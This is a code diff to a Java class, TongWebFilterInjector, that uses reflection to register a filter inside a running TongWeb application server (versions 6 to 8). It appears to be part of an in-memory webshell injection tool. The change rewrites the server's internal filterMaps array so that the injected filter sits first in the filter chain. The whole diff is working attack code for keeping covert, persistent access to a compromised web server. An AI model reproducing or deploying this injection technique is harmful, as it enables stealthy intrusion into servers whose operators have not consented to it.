@@ -4,6 +4,7 @@ import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.io.PrintStream;
+import java.lang.reflect.Array;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
@@ -149,24 +150,28 @@ public class TongWebFilterInjector {
         String filterClassName = getClassName();
         Object filterDef;
         Object filterMap;
+        Class<?> filterMapClass;
         Constructor<?> constructor;
         ClassLoader contextClassLoader = context.getClass().getClassLoader();
         try {
             // tongweb 7
             constructor = contextClassLoader.loadClass("com.tongweb.catalina.core.ApplicationFilterConfig").getDeclaredConstructors()[0];
             filterDef = contextClassLoader.loadClass("com.tongweb.web.util.descriptor.web.FilterDef").newInstance();
-            filterMap = contextClassLoader.loadClass("com.tongweb.web.util.descriptor.web.FilterMap").newInstance();
+            filterMapClass = contextClassLoader.loadClass("com.tongweb.web.util.descriptor.web.FilterMap");
+            filterMap = filterMapClass.newInstance();
         } catch (Exception e2) {
             try {
                 // tongweb 6
                 constructor = contextClassLoader.loadClass("com.tongweb.web.thor.core.ApplicationFilterConfig").getDeclaredConstructors()[0];
                 filterDef = contextClassLoader.loadClass("com.tongweb.web.thor.deploy.FilterDef").newInstance();
-                filterMap = contextClassLoader.loadClass("com.tongweb.web.thor.deploy.FilterMap").newInstance();
+                filterMapClass = contextClassLoader.loadClass("com.tongweb.web.thor.deploy.FilterMap");
+                filterMap = filterMapClass.newInstance();
             } catch (Exception e) {
                 // tongweb 8
                 constructor = contextClassLoader.loadClass("com.tongweb.server.core.ApplicationFilterConfig").getDeclaredConstructors()[0];
                 filterDef = contextClassLoader.loadClass("com.tongweb.web.util.descriptor.web.FilterDef").newInstance();
-                filterMap = contextClassLoader.loadClass("com.tongweb.web.util.descriptor.web.FilterMap").newInstance();
+                filterMapClass = contextClassLoader.loadClass("com.tongweb.web.util.descriptor.web.FilterMap");
+                filterMap = filterMapClass.newInstance();
             }
         }
         invokeMethod(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{filterClassName});
@@ -174,7 +179,13 @@ public class TongWebFilterInjector {
         invokeMethod(context, "addFilterDef", new Class[]{filterDef.getClass()}, new Object[]{filterDef});
         invokeMethod(filterMap, "setFilterName", new Class[]{String.class}, new Object[]{filterClassName});
         invokeMethod(filterMap, "addURLPattern", new Class[]{String.class}, new Object[]{getUrlPattern()});
-        invokeMethod(context, "addFilterMapBefore", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
+
+        // addFilterMapFirst
+        Object[] filterMaps = (Object[]) invokeMethod(context, "findFilterMaps", null, null);
+        Object[] results = (Object[]) Array.newInstance(filterMapClass, filterMaps.length + 1);
+        results[0] = filterMap;
+        System.arraycopy(filterMaps, 0, results, 1, filterMaps.length);
+        setFieldValue(getFieldValue(context, "filterMaps"), "array", results);
 
         constructor.setAccessible(true);
         Object filterConfig = constructor.newInstance(context, filterDef);
@@ -247,19 +258,34 @@ public class TongWebFilterInjector {
         }
     }
 
+
     @SuppressWarnings("all")
-    public static Object getFieldValue(Object obj, String name) throws Exception {
-        Class<?> clazz = obj.getClass();
-        while (clazz != Object.class) {
+    public static Field getField(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
+        for (Class<?> clazz = obj.getClass();
+             clazz != Object.class;
+             clazz = clazz.getSuperclass()) {
             try {
-                Field field = clazz.getDeclaredField(name);
-                field.setAccessible(true);
-                return field.get(obj);
-            } catch (NoSuchFieldException var5) {
-                clazz = clazz.getSuperclass();
+                return clazz.getDeclaredField(name);
+            } catch (NoSuchFieldException ignored) {
+
             }
         }
         throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
+    }
+
+
+    @SuppressWarnings("all")
+    public static Object getFieldValue(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
+        Field field = getField(obj, name);
+        field.setAccessible(true);
+        return field.get(obj);
+    }
+
+
+    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
+        Field field = getField(obj, fieldName);
+        field.setAccessible(true);
+        field.set(obj, value);
     }
 
 
